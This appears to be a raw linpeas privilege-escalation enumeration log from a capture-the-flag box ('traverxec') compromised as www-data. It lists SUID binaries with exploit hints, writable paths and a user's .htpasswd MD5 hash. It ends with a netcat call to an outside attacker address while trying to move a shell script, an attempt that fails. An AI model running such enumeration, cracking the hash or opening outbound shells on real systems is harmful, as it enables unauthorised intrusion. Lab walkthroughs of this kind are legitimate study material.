╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
david:x:1000:1000:david,,,:/home/david:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
uid=101(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=102(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=103(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=104(messagebus) gid=110(messagebus) groups=110(messagebus)
uid=105(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)

╔══════════╣ Login now
 10:23:00 up 24 min,  0 users,  load average: 0.07, 0.03, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
reboot   system boot  Tue Nov 12 04:04:28 2019 - Tue Nov 12 04:06:23 2019  (00:01)     0.0.0.0
root     tty1         Tue Nov 12 04:02:12 2019 - down                      (00:02)     0.0.0.0
reboot   system boot  Tue Nov 12 04:01:38 2019 - Tue Nov 12 04:04:21 2019  (00:02)     0.0.0.0
root     tty1         Tue Nov 12 03:59:51 2019 - down                      (00:01)     0.0.0.0
reboot   system boot  Tue Nov 12 03:59:29 2019 - Tue Nov 12 04:01:28 2019  (00:01)     0.0.0.0
root     tty1         Tue Nov 12 03:56:15 2019 - down                      (00:03)     0.0.0.0
root     tty1         Tue Nov 12 03:51:49 2019 - Tue Nov 12 03:56:03 2019  (00:04)     0.0.0.0
reboot   system boot  Tue Nov 12 03:50:46 2019 - Tue Nov 12 03:59:19 2019  (00:08)     0.0.0.0

wtmp begins Sun Oct 27 16:25:39 2019

╔══════════╣ Last time logon each user
Username         Port     From             Latest
root             tty1                      Fri Sep 16 10:18:40 -0400 2022

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/nc
/usr/bin/nc.traditional
/usr/bin/netcat
/usr/bin/perl
/usr/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/python3.7
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers

╔══════════╣ Searching mysql credentials and exec

╔══════════╣ Analyzing Htpasswd Files (limit 70)
-rw-r--r-- 1 root bin 41 Oct 25  2019 /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/

╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Sep 16  2022 /etc/ldap


╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)





-rw-r--r-- 1 root root 176 Oct 25  2019 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 96 Oct 25  2019 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 396 Oct 25  2019 /etc/ssh/ssh_host_rsa_key.pub

ChallengeResponseAuthentication no
UsePAM yes
══╣ Some certificates were found (out limited):
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AddTrust_External_Root.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/CA_Disig_Root_R2.pem
/etc/ssl/certs/CFCA_EV_ROOT.pem
/etc/ssl/certs/COMODO_Certification_Authority.pem
968PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem	sftp	/usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Sep 16  2022 /etc/pam.d
-rw-r--r-- 1 root root 2133 Oct  6  2019 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open




╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Sep 16  2022 /usr/share/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
gpg Not Found
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 8132 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-automatic.gpg
-rw-r--r-- 1 root root 8141 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-security-automatic.gpg
-rw-r--r-- 1 root root 2332 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-stable.gpg
-rw-r--r-- 1 root root 5106 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-jessie-automatic.gpg
-rw-r--r-- 1 root root 5115 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-jessie-security-automatic.gpg
-rw-r--r-- 1 root root 2763 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-jessie-stable.gpg
-rw-r--r-- 1 root root 7443 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-automatic.gpg
-rw-r--r-- 1 root root 7452 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-security-automatic.gpg
-rw-r--r-- 1 root root 2263 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-stable.gpg
-rw-r--r-- 1 root root 8132 Apr 23  2019 /usr/share/keyrings/debian-archive-buster-automatic.gpg
-rw-r--r-- 1 root root 8141 Apr 23  2019 /usr/share/keyrings/debian-archive-buster-security-automatic.gpg
-rw-r--r-- 1 root root 2332 Apr 23  2019 /usr/share/keyrings/debian-archive-buster-stable.gpg
-rw-r--r-- 1 root root 5106 Apr 23  2019 /usr/share/keyrings/debian-archive-jessie-automatic.gpg
-rw-r--r-- 1 root root 5115 Apr 23  2019 /usr/share/keyrings/debian-archive-jessie-security-automatic.gpg
-rw-r--r-- 1 root root 2763 Apr 23  2019 /usr/share/keyrings/debian-archive-jessie-stable.gpg
-rw-r--r-- 1 root root 48747 Apr 23  2019 /usr/share/keyrings/debian-archive-keyring.gpg
-rw-r--r-- 1 root root 23889 Apr 23  2019 /usr/share/keyrings/debian-archive-removed-keys.gpg
-rw-r--r-- 1 root root 7443 Apr 23  2019 /usr/share/keyrings/debian-archive-stretch-automatic.gpg
-rw-r--r-- 1 root root 7452 Apr 23  2019 /usr/share/keyrings/debian-archive-stretch-security-automatic.gpg
-rw-r--r-- 1 root root 2263 Apr 23  2019 /usr/share/keyrings/debian-archive-stretch-stable.gpg



╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 675 Mar  1  2019 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing DNS Files (limit 70)
-rw-r--r-- 1 root root 856 Mar  1  2019 /usr/share/bash-completion/completions/bind
-rw-r--r-- 1 root root 856 Mar  1  2019 /usr/share/bash-completion/completions/bind




╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc





-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile






                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strings Not Found
strace Not Found
-rwsr-xr-x 1 root root 427K Oct  6  2019 /usr/lib/openssh/ssh-keysign
-r-sr-xr-x 1 root root 14K Nov 12  2019 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 14K Nov 12  2019 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-rwsr-xr-- 1 root messagebus 50K Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 35K Apr 22  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 154K Oct 12  2019 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root shadow 39K Feb 14  2019 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root mail 19K Dec  3  2017 /usr/bin/dotlockfile
-rwxr-sr-x 1 root tty 35K Jan 10  2019 /usr/bin/wall
-rwxr-sr-x 1 root shadow 31K Jul 27  2018 /usr/bin/expiry
-rwxr-sr-x 1 root tty 15K May  4  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 43K Jun 23  2019 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 71K Jul 27  2018 /usr/bin/chage
-rwxr-sr-x 1 root ssh 315K Oct  6  2019 /usr/bin/ssh-agent

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so
/etc/ld.so.conf
Content of /etc/ld.so.conf:
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
  - /usr/local/lib
  /etc/ld.so.conf.d/vmware-tools-libraries.conf
  - /usr/lib/vmware-tools/lib32/libvmGuestLib.so
  - /usr/lib/vmware-tools/lib64/libvmGuestLib.so
  - /usr/lib/vmware-tools/lib32/libvmGuestLibJava.so
  - /usr/lib/vmware-tools/lib64/libvmGuestLibJava.so
  - /usr/lib/vmware-tools/lib32/libDeployPkg.so
  - /usr/lib/vmware-tools/lib64/libDeployPkg.so
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
══╣ Current shell capabilities
CapInh:  0x0000000000000000=
CapPrm:  0x0000000000000000=
CapEff:	 0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=

══╣ Parent process capabilities
CapInh:	 0x0000000000000000=
CapPrm:	 0x0000000000000000=
CapEff:	 0x0000000000000000=
CapBnd:	 0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:	 0x0000000000000000=


Files with capabilities (limited to 50):
/usr/bin/ping = cap_net_raw+ep

╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root 3129 Feb 10  2019 usr.bin.man

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
files with acls in searched folders Not Found

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
total 12
drwxr-xr-x  2 root root 4096 Sep 16  2022 .
drwxr-xr-x 73 root root 4096 Dec  9 10:22 ..
-rw-r--r--  1 root root  664 Mar  1  2019 bash_completion.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)

╔══════════╣ Readable files belonging to root and readable by me but not world readable

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/run/lock
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory

/var/nostromo/logs
/var/nostromo/logs/nhttpd.pid
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files



                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════
                            ╚═════════════════════════╝
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
/usr/bin/gettext.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2019-11-12+04:56:20.6510252160 /etc/vmware-tools/vgauth.conf.dpkg-old
2019-11-12+04:56:20.6430252160 /var/lib/vmware-caf/pme/data/input/invokers/caf_RemoteCommandProvider_1_0_0.sh
2019-11-12+04:56:20.6430252160 /var/lib/vmware-caf/pme/data/input/invokers/caf_InstallProvider_1_0_0.sh
2019-11-12+04:56:20.6430252160 /var/lib/vmware-caf/pme/data/input/invokers/caf_ConfigProvider_1_0_0.sh
2019-11-12+04:56:20.6430252160 /var/lib/vmware-caf/pme/data/input/invokers/cafTestInfra_CafTestInfraProvider_1_0_0.sh
2019-11-12+04:56:20.6430252160 /var/lib/vmware-caf/pme/data/input/installProviderHeader.sh
2019-11-12+04:56:20.6430252160 /usr/lib/vmware-tools/lib64/libManagementAgentHost.so/libManagementAgentHost.so
2019-11-12+04:56:20.6430252160 /usr/lib/vmware-tools/lib64/libCommAmqpListener.so/libCommAmqpListener.so
2019-11-12+04:56:20.6430252160 /etc/vmware-tools/guestproxy-ssl.conf
2019-11-12+04:56:20.6430252160 /etc/vmware-caf/pme/scripts/vgAuth
2019-11-12+04:56:20.6430252160 /etc/vmware-caf/pme/scripts/stop-ma
2019-11-12+04:56:20.6430252160 /etc/vmware-caf/pme/scripts/stop-listener
2019-11-12+04:56:20.6430252160 /etc/vmware-caf/pme/scripts/start-ma
2019-11-12+04:56:20.6430252160 /etc/vmware-caf/pme/scripts/caf-processes.sh
2019-11-12+04:56:20.6390252160 /etc/vmware-caf/pme/scripts/tearDownVgAuth
2019-11-12+04:56:20.6390252160 /etc/vmware-caf/pme/scripts/stop-VGAuthService
2019-11-12+04:56:20.6390252160 /etc/vmware-caf/pme/scripts/start-listener
2019-11-12+04:56:20.6390252160 /etc/vmware-caf/pme/scripts/start-VGAuthService
2019-11-12+04:56:20.6390252160 /etc/vmware-caf/pme/scripts/setUpVgAuth
2019-11-12+04:56:20.6390252160 /etc/vmware-caf/pme/scripts/is-ma-running
2019-11-12+04:56:20.6390252160 /etc/vmware-caf/pme/scripts/is-listener-running
2019-11-12+04:56:20.6390252160 /etc/vmware-caf/pme/scripts/caf-common
2019-11-12+04:56:20.6390252160 /etc/vmware-caf/pme/install/upgrade.sh
2019-11-12+04:56:20.6390252160 /etc/vmware-caf/pme/install/stopAndRemoveServices.sh
2019-11-12+04:56:20.6390252160 /etc/vmware-caf/pme/install/restartServices.sh
2019-11-12+04:56:20.6390252160 /etc/vmware-caf/pme/install/preupgrade.sh
2019-11-12+04:56:20.6390252160 /etc/vmware-caf/pme/install/preuninstall.sh
2019-11-12+04:56:20.6390252160 /etc/vmware-caf/pme/install/preremoveUninstall.sh
2019-11-12+04:56:20.6390252160 /etc/vmware-caf/pme/install/preinstallUpgrade.sh
2019-11-12+04:56:20.6390252160 /etc/vmware-caf/pme/install/preconfigure-listener.sh
2019-11-12+04:56:20.6390252160 /etc/vmware-caf/pme/install/postinstallUpgrade.sh
2019-11-12+04:56:20.6390252160 /etc/vmware-caf/pme/install/postinstallInstall.sh
2019-11-12+04:56:20.6390252160 /etc/vmware-caf/pme/install/caf-vgauth
2019-11-12+04:56:20.6390252160 /etc/vmware-caf/pme/install/caf-dbg.sh
2019-11-12+04:56:20.6390252160 /etc/vmware-caf/pme/install/caf-c-management-agent
2019-11-12+04:56:20.6390252160 /etc/vmware-caf/pme/install/caf-c-communication-service
2019-11-12+04:56:20.6350252160 /usr/lib/vmware-caf/pme/bin/RemoteCommandProvider
2019-11-12+04:56:20.6350252160 /etc/vmware-caf/pme/install/install.sh
2019-11-12+04:56:20.6310252160 /usr/lib/vmware-caf/pme/bin/TestInfraProvider
2019-11-12+04:56:20.6310252160 /usr/lib/vmware-caf/pme/bin/InstallProvider
2019-11-12+04:56:20.6310252160 /usr/lib/vmware-caf/pme/bin/ConfigProvider
2019-11-12+04:56:20.6270252160 /usr/lib/vmware-caf/pme/lib/libFramework.so
2019-11-12+04:56:20.6270252160 /usr/lib/vmware-caf/pme/lib/libCommAmqpListener.so
2019-11-12+04:56:20.6150252160 /usr/lib/vmware-caf/pme/lib/libProviderFx.so
2019-11-12+04:56:20.6150252160 /usr/lib/vmware-caf/pme/lib/libCommAmqpIntegrationSubsys.so
2019-11-12+04:56:20.6110252160 /usr/lib/vmware-caf/pme/lib/liblog4cpp.so.5.0.6
2019-11-12+04:56:20.6110252160 /usr/lib/vmware-caf/pme/lib/libManagementAgentHost.so
2019-11-12+04:56:20.6070252160 /usr/lib/vmware-caf/pme/lib/libIntegrationSubsys.so
2019-11-12+04:56:20.6070252160 /usr/lib/vmware-caf/pme/lib/libCommIntegrationSubsys.so
2019-11-12+04:56:20.6070252160 /usr/lib/vmware-caf/pme/lib/libCafIntegrationSubsys.so
2019-11-12+04:56:20.6030252160 /usr/lib/vmware-caf/pme/lib/libCommAmqpIntegration.so
2019-11-12+04:56:20.5990252170 /usr/lib/vmware-caf/pme/lib/librabbitmq.so.4.2.1
2019-11-12+04:56:20.5990252170 /usr/lib/vmware-caf/pme/lib/libVgAuthIntegrationSubsys.so
2019-11-12+04:56:20.5990252170 /usr/lib/vmware-caf/pme/lib/libMaIntegrationSubsys.so
2019-11-12+04:56:16.0670252770 /usr/lib/vmware-tools/plugins64/vmsvc/libvmbackup.so
2019-11-12+04:56:16.0670252770 /usr/lib/vmware-tools/plugins64/vmsvc/libgrabbitmqProxy.so
2019-11-12+04:56:16.0670252770 /usr/lib/vmware-tools/plugins64/vmsvc/libautoUpgrade.so
2019-11-12+04:56:16.0550252770 /usr/lib/vmware-tools/plugins64/vmusr/libdndcp.so
2019-11-12+04:56:16.0550252770 /usr/lib/vmware-tools/plugins64/vmsvc/libtimeSync.so
2019-11-12+04:56:16.0550252770 /usr/lib/vmware-tools/plugins64/vmsvc/libresolutionKMS.so
2019-11-12+04:56:16.0550252770 /usr/lib/vmware-tools/plugins64/vmsvc/libpowerOps.so
2019-11-12+04:56:16.0550252770 /usr/lib/vmware-tools/plugins64/vmsvc/libguestInfo.so
2019-11-12+04:56:16.0550252770 /usr/lib/vmware-tools/plugins64/vmsvc/libdeployPkgPlugin.so
2019-11-12+04:56:16.0550252770 /usr/lib/vmware-tools/plugins64/common/libvix.so
2019-11-12+04:56:16.0550252770 /usr/lib/vmware-tools/plugins64/common/libhgfsServer.so
2019-11-12+04:56:16.0510252770 /usr/lib/vmware-tools/plugins64/vmusr/libresolutionSet.so
2019-11-12+04:56:16.0510252770 /usr/lib/vmware-tools/plugins64/vmusr/libdesktopEvents.so
2019-11-12+04:56:15.7470252810 /usr/lib/vmware-tools/sbin64/vmtoolsd
2019-11-12+04:56:15.7470252810 /usr/lib/vmware-tools/bin64/appLoader
2019-11-12+04:56:15.7470252810 /usr/lib/vmware-caf/pme/bin/ManagementAgentHost

╔══════════╣ Unexpected in root
/initrd.img
/vmlinuz.old
/initrd.img.old
/.bash_history
/vmlinuz

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/etc/resolv.conf

╔══════════╣ Writable log files (logrotten) (limit 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation
logrotate 3.14.0

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes

╔══════════╣ Files inside /home/www-data (limit 20)

╔══════════╣ Files inside others home (limit 20)

╔══════════╣ Searching installed mail applications

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup files (limited 100)
-rwxr-xr-x 1 root root 34132 Nov 12  2019 /usr/lib/vmware-tools/plugins32/vmsvc/libvmbackup.so
-rwxr-xr-x 1 root root 38984 Nov 12  2019 /usr/lib/vmware-tools/plugins64/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 43736 Aug 24  2022 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 9716 Sep 20  2019 /usr/lib/modules/4.19.0-6-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 363752 Apr 30  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
-rw-r--r-- 1 root root 303 Oct 26  2018 /usr/share/doc/hdparm/changelog.old.gz

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/apt/listchanges.db: Berkeley DB (Hash, version 9, native byte-order)


╔══════════╣ Web files?(output limit)

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 0 Dec  9 09:58 /run/network/.ifstate.lock
-rw-r--r-- 1 root root 220 Apr 18  2019 /etc/skel/.bash_logout
-rw------- 1 root root 0 Oct 25  2019 /etc/.pwd.lock
-rw-r--r-- 1 root root 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rwxr-xr-x 1 www-data www-data 3235784 Dec  9 10:19 /tmp/linpeas_linux_amd64
-rw-r--r-- 1 root root 40960 Nov 12  2019 /var/backups/alternatives.tar.0

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/grub/i386-pc/legacy_password_test.mod
/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-wall.path
/usr/lib/systemd/system/systemd-ask-password-wall.service
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man1/systemd-ask-password.1.gz
/usr/share/man/man1/systemd-tty-ask-password-agent.1.gz
/usr/share/man/man7/credentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                ╚════════════════╝
Regexes to search for API keys aren't activated, use param '-r' 


www-data@traverxec:/tmp$ nc 10.10.14.3 8000
nano shell.sh
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 400</p>
        <p>Message: Bad HTTP/0.9 request type ('nano').</p>
        <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
    </body>
</html>nc 10.10.14.3 8000
nano shell.sh
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 400</p>
        <p>Message: Bad HTTP/0.9 request type ('nano').</p>
        <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
    </body>
(UNKNOWN) [10.10.14.3] 8000 (?) : Connection refused
